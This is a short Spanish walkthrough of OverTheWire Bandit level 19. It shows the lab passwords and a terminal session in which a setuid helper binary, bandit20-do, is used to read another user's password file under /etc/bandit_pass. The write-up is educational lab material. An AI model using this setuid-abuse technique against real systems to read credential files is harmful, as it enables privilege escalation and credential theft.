# Level 19
## Objetivo
Obtener la contraseña del bandit 20 aprovechando el archivo bandit20-do
## Datos de acceso al nivel
bandit19@bandit.labs.overthewire.org
awhqfNnAbc1naukrpqDYcF95h7HoMTrC
## Solución
```
bandit19@bandit:~$ ls -la
total 36
drwxr-xr-x  2 root     root      4096 Apr 23 18:04 .
drwxr-xr-x 70 root     root      4096 Apr 23 18:05 ..
-rwsr-x---  1 bandit20 bandit19 14876 Apr 23 18:04 bandit20-do
-rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root     root       807 Jan  6  2022 .profile
bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
VxCazJaVykI6W36BkBU0mJTCM8rR95XT
```
## Notas adicionales
Vemos todos los archivos que hay, vemos el bandit20-do, el cual tiene permisos para que lo ejecutemos, lo que nos permite acceder como si fuéramos ellos a la contraseña mediante el comando cat /etc/bandit_pass/bandit20
## Referencias